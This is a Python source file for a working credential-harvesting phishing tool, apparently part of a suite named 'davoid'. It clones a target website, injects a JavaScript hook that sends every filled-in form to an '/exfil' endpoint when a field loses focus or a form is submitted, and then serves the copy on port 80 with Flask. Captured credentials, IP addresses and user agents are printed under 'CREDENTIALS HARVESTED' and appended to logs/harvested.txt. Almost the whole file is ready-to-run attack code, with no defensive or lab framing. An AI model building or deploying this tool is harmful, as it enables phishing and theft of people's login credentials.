import os
import threading
import logging
import sys

# --- START FIX FOR PYTHON 3.13+ (No module named 'cgi') ---
try:
    import cgi
except ImportError:
    # Creating a shim for the missing cgi module to satisfy pywebcopy
    from types import ModuleType
    cgi = ModuleType("cgi")
    cgi.parse_header = lambda line: (line, {}) # Mocking the specific function often used
    sys.modules["cgi"] = cgi
# --- END FIX ---

from flask import Flask, request, send_from_directory
from pywebcopy import save_webpage
from rich.console import Console
from rich.panel import Panel

# Suppress Flask/Werkzeug logs for a cleaner terminal UI
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

console = Console()
app = Flask(__name__)

# Constants
BASE_CLONE_PATH = "/opt/davoid/clones"

@app.route('/exfil', methods=['POST'])
def exfil():
    """
    Endpoint for data exfiltration. 
    Handles incoming form data and logs it to a file.
    """
    try:
        data = request.form.to_dict()
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        console.print(Panel(
            f"[bold red]CREDENTIALS HARVESTED[/bold red]\n"
            f"[yellow]IP:[/yellow] {client_ip}\n"
            f"[yellow]Data:[/yellow] {data}",
            title="Exfiltration Event",
            border_style="red"
        ))

        if not os.path.exists("logs"):
            os.makedirs("logs")

        with open("logs/harvested.txt", "a") as f:
            f.write(f"--- Event: {client_ip} ---\n")
            f.write(f"UA: {user_agent}\n")
            f.write(f"Payload: {data}\n\n")

        return "Success", 200
    except Exception as e:
        console.print(f"[red]Exfil Error: {e}[/red]")
        return "Error", 500

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_clone(path):
    """Modern Flask static file server for the cloned directory."""
    directory = os.getcwd()
    if path == "" or os.path.isdir(os.path.join(directory, path)):
        return send_from_directory(directory, 'index.html')
    return send_from_directory(directory, path)

def run_server(path):
    """Starts the Flask server to host the cloned site and capture data."""
    try:
        # Flask 3.x+ handles threading by default
        app.run(host='0.0.0.0', port=80, debug=False)
    except Exception as e:
        console.print(f"[bold red][!] Server Failure: {e}[/bold red]")

def clone_site():
    """Logic for cloning a target site and injecting the harvester hook."""
    if os.getuid() != 0:
        return console.print("[red][!] Root required to host on port 80.[/red]")

    console.print("[bold cyan]Site Cloner & Harvester (Pro Version)[/bold cyan]")
    
    target_url = console.input("[bold yellow]Target URL to Clone (e.g. https://example.com): [/bold yellow]").strip()
    project = console.input("[bold yellow]Project Name: [/bold yellow]").strip()

    if not os.path.exists(BASE_CLONE_PATH):
        try:
            os.makedirs(BASE_CLONE_PATH)
        except Exception as e:
            return console.print(f"[red]Permission Error: Could not create {BASE_CLONE_PATH}. {e}[/red]")

    console.print(f"[*] Cloning {target_url}... (This may take a moment)")
    try:
        # Fixed: Enhanced pywebcopy call with more robust flags
        save_webpage(
            url=target_url, 
            project_folder=BASE_CLONE_PATH,
            project_name=project, 
            bypass_robots=True,
            debug=False,
            open_in_browser=False,
            delay=None,
            threaded=True
        )
    except Exception as e:
        return console.print(f"[red]Cloning failed: {e}[/red]")

    # Advanced Injected Hook
    hook = """
    <script>
    (function() {
        const logExfil = () => {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                const formData = new FormData(form);
                let hasData = false;
                for (let value of formData.values()) { if(value) hasData = true; }
                
                if (hasData) {
                    fetch('/exfil', {
                        method: 'POST',
                        body: formData
                    }).catch(err => console.error('Exfil failed', err));
                }
            });
        };
        // Listen for input blur or form submission
        document.querySelectorAll('input').forEach(i => i.addEventListener('blur', logExfil));
        document.querySelectorAll('form').forEach(f => f.addEventListener('submit', logExfil));
    })();
    </script>
    """

    found_index = False
    project_root = os.path.join(BASE_CLONE_PATH, project)
    
    for root, _, files in os.walk(project_root):
        if "index.html" in files:
            index_path = os.path.join(root, "index.html")
            try:
                with open(index_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                
                if "</body>" in content:
                    content = content.replace("</body>", f"{hook}</body>")
                else:
                    content += hook
                    
                with open(index_path, "w", encoding="utf-8") as f:
                    f.write(content)
                
                project_path = root
                found_index = True
                break
            except Exception as e:
                console.print(f"[red]Failed to inject hook: {e}[/red]")

    if not found_index:
        return console.print("[red][!] Could not locate index.html. Cloning might be incomplete.[/red]")

    console.print("[green][+] Hook injected into index.html[/green]")

    if console.input("\n[bold cyan]Start Harvest Server? (y/N): [/bold cyan]").lower() == 'y':
        os.chdir(project_path)
        server_thread = threading.Thread(target=run_server, args=(project_path,), daemon=True)
        server_thread.start()
        
        console.print(f"[bold green][+] Portal active at http://[LOCAL_IP]/[/bold green]")
        console.print("[dim]Monitor logs/harvested.txt for data.[/dim]")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            console.print("\n[yellow][-] Harvester stopped.[/yellow]")

if __name__ == "__main__":
    import time
    clone_site()